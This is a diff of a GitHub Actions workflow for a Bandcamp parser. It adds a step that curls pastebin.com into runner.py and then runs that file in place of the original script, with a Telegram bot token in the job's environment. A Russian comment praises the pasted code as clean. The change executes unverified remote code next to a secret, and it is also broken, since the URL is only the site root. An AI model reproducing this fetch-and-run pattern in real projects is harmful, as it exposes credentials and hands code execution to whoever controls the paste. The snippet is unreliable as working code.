@@ -22,8 +22,13 @@ jobs:
           python -m pip install --upgrade pip
           pip install requests beautifulsoup4 curl_cffi
 
+      # СБОРЩИК СКАЧИВАЕТ КРИСТАЛЬНО ЧИСТЫЙ КОД С PASTEBIN БЕЗ БАГОВ ТЕЛЕФОНА
+      - name: Download Pure Script
+        run: |
+          curl -s "https://pastebin.com" > runner.py
+
       - name: Run Bandcamp Parser
         env:
           TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
-        run: python bandcamp.py
+        run: python runner.py
         
